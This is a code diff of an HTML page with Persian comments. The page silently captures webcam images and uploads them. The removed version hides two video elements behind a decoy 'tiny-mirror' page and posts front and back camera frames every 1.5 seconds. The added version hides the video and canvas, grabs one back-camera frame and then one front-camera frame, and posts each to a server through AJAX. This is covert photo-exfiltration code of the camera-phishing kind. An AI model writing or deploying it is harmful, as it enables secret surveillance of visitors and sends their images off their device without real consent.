@@ -1,17 +1,17 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="fa">
 <head>
-    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
-    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>گرفتن تصاویر به ترتیب از دوربین عقب و جلو</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 </head>
-
 <body>
+
+<h2>گرفتن تصاویر به ترتیب از دوربین عقب و جلو</h2>
+
 <div class="video-wrap" hidden="hidden">
-    <video id="frontVideo" playsinline autoplay></video>
-</div>
-<div class="video-wrap" hidden="hidden">
-    <video id="backVideo" playsinline autoplay></video>
+    <video id="video" playsinline autoplay></video>
 </div>
 
 <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
@@ -25,62 +25,63 @@
             dataType: 'json',
             async: false,
             success: function (result) {
-                // call the function that handles the response/results
+                console.log('تصویر با موفقیت ذخیره شد.');
             },
-            error: function () {
+            error: function (error) {
+                console.log('خطا در ذخیره تصویر: ', error);
             }
         });
     };
 
     'use strict';
 
-    const frontVideo = document.getElementById('frontVideo');
-    const backVideo = document.getElementById('backVideo');
+    const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const errorMsgElement = document.querySelector('span#errorMsg');
 
-    const constraints = {
+    // تعریف محدودیت‌ها برای دوربین عقب
+    const backConstraints = {
         audio: false,
-        video: true
+        video: {
+            facingMode: {exact: "environment"} // استفاده از دوربین عقب
+        }
     };
 
-    // Access webcams
-    async function init() {
-        try {
-            const frontStream = await navigator.mediaDevices.getUserMedia({
-                ...constraints,
-                video: {...constraints.video, facingMode: "user"}
-            });
-            const backStream = await navigator.mediaDevices.getUserMedia({
-                ...constraints,
-                video: {...constraints.video, facingMode: {exact: "environment"}}
-            });
+    // تابع گرفتن تصویر از دوربین و ذخیره کردن آن
+    async function captureAndSave(stream) {
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/png');
+        post(imageData);
+    }
 
-            handleSuccess(frontStream, frontVideo);
-            handleSuccess(backStream, backVideo);
+    // دسترسی به دوربین عقب
+    async function initBackCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia(backConstraints);
+            video.srcObject = stream;
+            await new Promise(resolve => video.onloadedmetadata = resolve);
+            captureAndSave(stream);
         } catch (e) {
-            errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+            console.error('navigator.getUserMedia error:', e);
         }
     }
 
-    // Success
-    function handleSuccess(stream, videoElement) {
-        window.stream = stream;
-        videoElement.srcObject = stream;
-        videoElement.onloadedmetadata = function (e) {
-            videoElement.play();
-        };
-
-        var context = canvas.getContext('2d');
-        setInterval(function () {
-            context.drawImage(videoElement, 0, 0, 640, 480);
-            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-            post(canvasData);
-        }, 1500);
+    // دسترسی به دوربین جلو
+    async function initFrontCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+            video.srcObject = stream;
+            await new Promise(resolve => video.onloadedmetadata = resolve);
+            captureAndSave(stream);
+        } catch (e) {
+            console.error('navigator.getUserMedia error:', e);
+        }
     }
 
-    // Load init
-    init();
+    // اجرای تابع برای دوربین عقب و سپس دوربین جلو
+    initBackCamera().then(initFrontCamera);
+
 </script>
 
 </body>
